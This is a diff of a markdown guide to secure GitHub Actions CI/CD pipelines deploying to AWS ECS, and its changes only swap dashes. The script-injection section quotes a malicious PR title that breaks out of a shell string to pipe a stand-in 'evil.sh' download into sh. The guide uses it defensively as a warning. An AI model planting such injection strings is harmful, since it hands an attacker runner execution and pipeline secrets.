@@ -1,4 +1,4 @@
-# CI/CD & GitHub Actions — A Complete Technical Guide
+# CI/CD & GitHub Actions - A Complete Technical Guide
 
 > Part of the **`cicd-ecs-security-E2E`** lab: a Terraform-provisioned CI/CD + DevSecOps
 > pipeline that builds a containerized app and deploys it to **AWS ECS Fargate** across
@@ -32,9 +32,9 @@ distinctions matter because they determine **where a human stands in the loop**.
 
 | Term | What it automates | Who decides to ship to prod? | Typical trigger |
 | --- | --- | --- | --- |
-| **Continuous Integration (CI)** | Merge → build → test → scan on every change. Catches integration problems early. | N/A — CI stops at "the artifact is good." | Every push / PR |
+| **Continuous Integration (CI)** | Merge → build → test → scan on every change. Catches integration problems early. | N/A - CI stops at "the artifact is good." | Every push / PR |
 | **Continuous Delivery (CD)** | Everything in CI **plus** packaging and deploying to non-prod, with prod deploy **ready at the push of a button**. | A **human** approves the final prod release. | Merge to main + manual approval |
-| **Continuous Deployment** | Same as delivery, but the prod deploy is **fully automatic** when all gates pass. | **Nobody** — the pipeline ships if green. | Merge to main |
+| **Continuous Deployment** | Same as delivery, but the prod deploy is **fully automatic** when all gates pass. | **Nobody** - the pipeline ships if green. | Merge to main |
 
 ```
                 ┌──────────── Continuous Integration ────────────┐
@@ -70,9 +70,9 @@ Environment-specific behavior should come from **configuration injected at deplo
 
 > ⚠️ **Pitfall:** Tagging by a mutable tag like `latest` breaks build-once-deploy-many.
 > Two deploys of "`latest`" can resolve to different image digests. Always promote an
-> **immutable** identifier — a semver tag (`v1.4.2`) or, best, the **image digest**
+> **immutable** identifier - a semver tag (`v1.4.2`) or, best, the **image digest**
 > (`@sha256:…`). This lab tags prod with an auto-incremented `vX.Y.Z` and dev/qa with the
-> 12-char commit SHA — both immutable.
+> 12-char commit SHA - both immutable.
 
 ### 1.3 Environment promotion: dev → qa → prod
 
@@ -98,7 +98,7 @@ In this repo the mapping is **branch-driven**:
 | | **Trunk-based development** | **GitFlow** |
 | --- | --- | --- |
 | Long-lived branches | Just `main` (the "trunk") | `main`, `develop`, plus `release/*`, `hotfix/*` |
-| Feature work | Short-lived branches merged ≤1–2 days | Feature branches off `develop`, can be long |
+| Feature work | Short-lived branches merged ≤1-2 days | Feature branches off `develop`, can be long |
 | Release | Tag on trunk; deploy continuously | Cut a `release/*` branch, stabilize, merge back |
 | Best for | High-velocity teams, CD, microservices | Scheduled releases, multiple supported versions |
 | Risk | Requires strong tests + feature flags | Merge hell, slow feedback, drift between branches |
@@ -137,11 +137,11 @@ workflow
 | --- | --- | --- |
 | `push` | Commits are pushed to matching branches/tags | The workhorse for CI + deploy-on-merge. |
 | `pull_request` | A PR is opened/updated/reopened | Runs in the context of the **PR head**; **does not** get repo secrets when the PR is from a **fork** (good!). `GITHUB_TOKEN` is read-only for forks. |
-| `pull_request_target` | Same as above, but runs in the context of the **base** repo | **Gets full secrets and a writable token.** ⚠️ Extremely dangerous if you `checkout` the PR head — see §5.1. |
+| `pull_request_target` | Same as above, but runs in the context of the **base** repo | **Gets full secrets and a writable token.** ⚠️ Extremely dangerous if you `checkout` the PR head - see §5.1. |
 | `workflow_dispatch` | A human (or API) manually starts it | Supports typed `inputs:`. Great for manual prod deploys / rollbacks. |
 | `schedule` | Cron (`- cron: '0 6 * * *'`), UTC | Use for nightly scans, dependency audits. Skewed timing under load. |
 | `workflow_call` | Another workflow calls it | Makes the workflow a **reusable workflow** (§2.12). |
-| `workflow_run` | Another workflow completes | Runs *after* a named workflow; runs in the **base** context (secrets available) — handle untrusted artifacts carefully. |
+| `workflow_run` | Another workflow completes | Runs *after* a named workflow; runs in the **base** context (secrets available) - handle untrusted artifacts carefully. |
 
 ```yaml
 on:
@@ -157,9 +157,9 @@ on:
         options: [dev, qa, prod]
 ```
 
-> ⚠️ **Pitfall — `pull_request_target`:** People reach for it to "give PRs access to
+> ⚠️ **Pitfall - `pull_request_target`:** People reach for it to "give PRs access to
 > secrets" (e.g., to comment on the PR). The default `pull_request_target` checkout is the
-> *base* branch — safe. But the moment you add `ref: ${{ github.event.pull_request.head.sha }}`
+> *base* branch - safe. But the moment you add `ref: ${{ github.event.pull_request.head.sha }}`
 > you are running **attacker-controlled code with full secrets**. Avoid `pull_request_target`
 > unless you fully understand it; never check out PR head code in it.
 
@@ -173,7 +173,7 @@ on:
 
 | | **GitHub-hosted** | **Self-hosted** |
 | --- | --- | --- |
-| Setup | Zero — `runs-on: ubuntu-latest` | You install & maintain the runner agent |
+| Setup | Zero - `runs-on: ubuntu-latest` | You install & maintain the runner agent |
 | Isolation | Fresh ephemeral VM each run | You own isolation (re-use = risk) |
 | Cost | Free minutes + per-minute after | Your hardware/cloud bill |
 | Use when | Default for ~everything | Need GPUs, private network, big caches, specific OS |
@@ -238,7 +238,7 @@ jobs:
 | `env:` (workflow/job/step) | ❌ No | ✅ Yes |
 | `vars.*`, `secrets.*`, `github.*`, `needs.*` | ✅ Yes | ✅ Yes |
 
-> ⚠️ **Pitfall:** For **job-level** conditions, use `vars`, `needs`, or `github.*` — not
+> ⚠️ **Pitfall:** For **job-level** conditions, use `vars`, `needs`, or `github.*` - not
 > `env`. This lab correctly uses `if: github.event_name == 'push'` at step level and
 > `if: github.event_name == 'push'` at the `deploy` job level (a `github.*` value, which
 > job-level `if:` *can* read).
@@ -304,7 +304,7 @@ concurrency:
 ```
 
 > ⚠️ **Pitfall:** `cancel-in-progress: true` is great for CI on PRs (cancel stale builds)
-> but **dangerous for deploy jobs** — cancelling mid-deploy can leave a half-rolled service.
+> but **dangerous for deploy jobs** - cancelling mid-deploy can leave a half-rolled service.
 > For deploys, prefer `cancel-in-progress: false` (queue, don't cancel).
 
 ### 2.9 Caching (`actions/cache`)
@@ -361,8 +361,8 @@ jobs:
 image. **How you pin `@ref` is a security decision** (see §5.4):
 
 ```yaml
-- uses: actions/checkout@v4                                   # tag — convenient, mutable
-- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # full SHA — immutable ✅
+- uses: actions/checkout@v4                                   # tag - convenient, mutable
+- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # full SHA - immutable ✅
 ```
 
 ### 2.13 Permissions & `GITHUB_TOKEN` least privilege
@@ -390,10 +390,10 @@ jobs:
 A **GitHub Environment** is a named deployment target (`dev`, `qa`, `prod`) with protection
 rules. A job that declares `environment: prod` will **pause** until the rules are satisfied:
 
-- **Required reviewers** — named users/teams must click *Approve* before the job runs.
-- **Wait timer** — a forced delay (e.g., 10 min "cool-off" before prod).
-- **Deployment branch policy** — restrict which branches may deploy to this environment.
-- **Environment secrets/vars** — resolve **only after** approval, so secrets can't be read
+- **Required reviewers** - named users/teams must click *Approve* before the job runs.
+- **Wait timer** - a forced delay (e.g., 10 min "cool-off" before prod).
+- **Deployment branch policy** - restrict which branches may deploy to this environment.
+- **Environment secrets/vars** - resolve **only after** approval, so secrets can't be read
   by an un-approved run.
 
 This is the **approval gate**. In this lab, environments + reviewers + wait timers are
@@ -465,17 +465,17 @@ flowchart TD
 
 **Why this order:**
 
-- **Lint/unit first** — seconds of compute reject the most common mistakes before you spend
+- **Lint/unit first** - seconds of compute reject the most common mistakes before you spend
   minutes building.
-- **Static scans before build** — secret/SAST/IaC scans need only source; running them early
+- **Static scans before build** - secret/SAST/IaC scans need only source; running them early
   fails fast and keeps secrets out of any built artifact.
-- **Build before image scan** — you can only scan layers you've built.
-- **SBOM + sign right after build** — capture provenance for the *exact* artifact you'll ship.
-- **Integration/e2e after build** — they're slow and need the runnable artifact; gate them
+- **Build before image scan** - you can only scan layers you've built.
+- **SBOM + sign right after build** - capture provenance for the *exact* artifact you'll ship.
+- **Integration/e2e after build** - they're slow and need the runnable artifact; gate them
   behind the cheap checks.
-- **Push & deploy last, gated** — only validated artifacts reach a registry; only approved
+- **Push & deploy last, gated** - only validated artifacts reach a registry; only approved
   artifacts reach prod.
-- **Smoke test + rollback** — verify reality, and have an automatic exit if it's wrong.
+- **Smoke test + rollback** - verify reality, and have an automatic exit if it's wrong.
 
 ---
 
@@ -546,7 +546,7 @@ jobs:
   run: docker build -t app:ci .
 ```
 
-### 4.5 SAST (SonarQube — as used in this lab)
+### 4.5 SAST (SonarQube - as used in this lab)
 
 ```yaml
 - name: SonarQube scan
@@ -618,7 +618,7 @@ CodeQL alternative (emits SARIF to the Security tab):
 ```yaml
 # publish
 - run: docker push "$REGISTRY/$REPO:$TAG"
-# deploy (ECS) — see §7
+# deploy (ECS) - see §7
 # smoke test
 - run: |
     for i in $(seq 1 10); do
@@ -660,7 +660,7 @@ head there. This lab uses plain `pull_request` and grants **no AWS access** on P
 ### 5.2 Script injection via `${{ github.event.* }}` in `run:`
 
 Untrusted fields (PR title, branch name, commit message, issue body) are interpolated
-**before** the shell runs — an attacker controls the script text:
+**before** the shell runs - an attacker controls the script text:
 
 ```yaml
 # ❌ injection: a PR titled `"; curl evil.sh | sh; #` executes on your runner
@@ -690,7 +690,7 @@ trust policy restricting the `sub` to that env/branch (`iam.tf`).
 ### 5.4 Unpinned third-party actions
 
 > ⚠️ A tag like `@v4` or `@master` is **mutable**. If the action's maintainer (or an
-> attacker who compromises them) re-points the tag, your pipeline silently runs new code —
+> attacker who compromises them) re-points the tag, your pipeline silently runs new code -
 > **with your secrets**.
 
 ```yaml
@@ -703,7 +703,7 @@ version helps). First-party `actions/*` and verified publishers are lower risk b
 still best practice. Enable Dependabot for actions to get SHA-bump PRs.
 
 > Note: the lab's `ci-cd.yml` uses tag pins (`@v4`, and `snyk/actions/docker@master`) for
-> readability as a teaching example. **In production, pin these to SHAs** —
+> readability as a teaching example. **In production, pin these to SHAs** -
 > `@master` in particular is the weakest possible pin.
 
 ### 5.5 Cache poisoning
@@ -722,7 +722,7 @@ lockfile-hash keys so unexpected content invalidates.
 - Never `echo` secrets. Avoid `set -x` in steps that touch secrets.
 - Beware passing secrets as command-line args (visible in process lists / verbose logs);
   prefer env vars or files.
-- Forked PRs do **not** receive secrets (by design) — don't try to work around this.
+- Forked PRs do **not** receive secrets (by design) - don't try to work around this.
 
 ### 5.7 Flaky / slow tests
 
@@ -773,8 +773,8 @@ environment (§2.8). For deploys, **queue** rather than cancel.
 
 ## 6. DevSecOps: shift-left scanning & gating policy
 
-**Shift-left** = run security checks as early (and as often) as possible — in the IDE, in
-pre-commit hooks, and in CI on every PR — instead of a single audit before release. The
+**Shift-left** = run security checks as early (and as often) as possible - in the IDE, in
+pre-commit hooks, and in CI on every PR - instead of a single audit before release. The
 earlier a flaw is caught, the cheaper it is to fix.
 
 | Scan type | What it inspects | Earliest place it can run | Gate policy |
@@ -797,7 +797,7 @@ earlier a flaw is caught, the cheaper it is to fix.
   not a per-reviewer judgment call.
 
 > In this lab: **SonarQube** (SAST) runs on every PR and push and *can* fail the build;
-> **Snyk** container scan runs with `continue-on-error: true` (it **warns** — reports vulns
+> **Snyk** container scan runs with `continue-on-error: true` (it **warns** - reports vulns
 > without blocking). That's a deliberate teaching default; tighten Snyk to block on
 > critical for real use.
 
@@ -826,7 +826,7 @@ permissions:
 - Runs on **push** to the three environment branches and on **PRs** targeting them.
 - Top-level permissions are minimal: read code + mint OIDC tokens.
 
-### 7.2 Job `build-and-scan` — runs on **both** PRs and pushes
+### 7.2 Job `build-and-scan` - runs on **both** PRs and pushes
 
 ```yaml
 permissions:
@@ -843,17 +843,17 @@ outputs:
 
 - It elevates `contents: write` (only here) to push a git tag on prod.
 - Secrets are surfaced into `env` so steps can do `if: env.SONAR_TOKEN != ''`
-  (gracefully skip scanners when the token isn't configured — see §2.5).
+  (gracefully skip scanners when the token isn't configured - see §2.5).
 - It exposes two **job outputs** (`image`, `version`) for the `deploy` job.
 
-**Steps that always run (PRs too — no AWS):**
+**Steps that always run (PRs too - no AWS):**
 
-1. `actions/checkout@v4` with `fetch-depth: 0` — full history **and tags**, required for the
+1. `actions/checkout@v4` with `fetch-depth: 0` - full history **and tags**, required for the
    semver bump on `main`.
-2. **Build image (validation):** `docker build -t app:ci .` — proves the image builds even on
+2. **Build image (validation):** `docker build -t app:ci .` - proves the image builds even on
    PRs (no registry needed).
-3. **SonarQube scan** — runs only if `SONAR_TOKEN` is set (SAST; **can block**).
-4. **Snyk container scan** — `continue-on-error: true` → **warns, never blocks** (§6).
+3. **SonarQube scan** - runs only if `SONAR_TOKEN` is set (SAST; **can block**).
+4. **Snyk container scan** - `continue-on-error: true` → **warns, never blocks** (§6).
 
 **Steps gated by `if: github.event_name == 'push'` (skipped on PRs):**
 
@@ -862,20 +862,20 @@ outputs:
    branch → `exit 1`.
 6. **Determine version** (`id: version`): on `main`, fetch tags, find latest `vX.Y.Z`, bump
    **patch** → e.g. `v0.0.3`; on dev/qa, use the 12-char commit SHA (`${GITHUB_SHA::12}`).
-7. **Create & push git tag** — `main` only; tags the repo with the new semver as
+7. **Create & push git tag** - `main` only; tags the repo with the new semver as
    `github-actions[bot]` (this is why the job needed `contents: write`).
 8. **Configure AWS credentials (OIDC):** assumes the **env-scoped role** from step `cfg`
-   (`vars.ROLE_ARN_DEV/QA/PROD`) — no static keys.
+   (`vars.ROLE_ARN_DEV/QA/PROD`) - no static keys.
 9. **Login to ECR** (`id: ecr`).
 10. **Tag & push image** (`id: push`): tags `app:ci` as
     `$REGISTRY/$REPOSITORY:$TAG` and pushes it to **that environment's ECR**, then exports
     `image=` as a step/job output.
 
 > **Key security property:** on a **pull request**, every AWS-touching step is skipped.
-> A PR can only **build and scan** — it never gets cloud credentials, never pushes an image,
+> A PR can only **build and scan** - it never gets cloud credentials, never pushes an image,
 > never deploys. This is the safe-by-default posture from §5.1.
 
-### 7.3 Job `deploy` — push-only, environment-gated
+### 7.3 Job `deploy` - push-only, environment-gated
 
 ```yaml
 deploy:
@@ -888,10 +888,10 @@ deploy:
     id-token: write
 ```
 
-- `needs: build-and-scan` — waits for the build and **inherits its outputs**
+- `needs: build-and-scan` - waits for the build and **inherits its outputs**
   (`needs.build-and-scan.outputs.image`).
-- `if: github.event_name == 'push'` — never deploys from a PR (job-level `if:` reading a
-  `github.*` value, which is allowed — §2.5).
+- `if: github.event_name == 'push'` - never deploys from a PR (job-level `if:` reading a
+  `github.*` value, which is allowed - §2.5).
 - `environment:` selects the matching **GitHub Environment** where the approval gate / wait
   timer lives: `main → prod`, otherwise `dev`/`qa`. **This is the human gate**: the prod env
   has required reviewers (provisioned in `github.tf` / `iam.tf`), so the deploy **pauses**
@@ -901,14 +901,14 @@ deploy:
 **Deploy steps:**
 
 1. `actions/checkout@v4`.
-2. **Configure AWS credentials (OIDC):** assumes `vars.AWS_ROLE_ARN` — the **environment-scoped**
+2. **Configure AWS credentials (OIDC):** assumes `vars.AWS_ROLE_ARN` - the **environment-scoped**
    role (resolved from the GitHub Environment, so it's the right role for dev/qa/prod).
 3. **Fetch current task definition:** `aws ecs describe-task-definition`, stripping
    server-managed fields with `jq` into `task-def.json`.
 4. **Render task definition with new image** (`amazon-ecs-render-task-definition`): injects
    `needs.build-and-scan.outputs.image` into the named container.
 5. **Deploy to ECS** (`amazon-ecs-deploy-task-definition`) with
-   `wait-for-service-stability: true` — registers the new revision, updates the service, and
+   `wait-for-service-stability: true` - registers the new revision, updates the service, and
    **waits until ECS reports the service stable** (so a failed rollout fails the job).
 
 ### 7.4 How the pieces map to AWS IAM (build-once + least privilege)
@@ -921,7 +921,7 @@ shared task-execution role. Net effect:
 
 - The **dev** pipeline physically **cannot** assume the **prod** role.
 - The image built once in `build-and-scan` is pushed to the env's ECR and the **same image
-  reference** is what `deploy` renders into the task definition — **build-once-deploy** in
+  reference** is what `deploy` renders into the task definition - **build-once-deploy** in
   practice.
 
 ### 7.5 End-to-end flow
@@ -973,7 +973,7 @@ push to main ▶ build-and-scan ──▶ bump vX.Y.Z + push git tag ──▶ p
 - [ ] Secrets **never echoed**; not passed as CLI args; `set -x` avoided around secrets.
 - [ ] **Concurrency**: deploys queue (no `cancel-in-progress` mid-deploy).
 - [ ] Cache keys are lockfile-hash based; restored caches treated as untrusted.
-- [ ] Self-hosted runners are **ephemeral & isolated** — or avoided on public repos.
+- [ ] Self-hosted runners are **ephemeral & isolated** - or avoided on public repos.
 - [ ] **Required reviewers + wait timer** on the prod environment; branch protection on `main`.
 - [ ] Dependabot enabled for GitHub Actions to keep pinned SHAs current.
 - [ ] Scan results published as **SARIF**; explicit, version-controlled **block-vs-warn** policy.
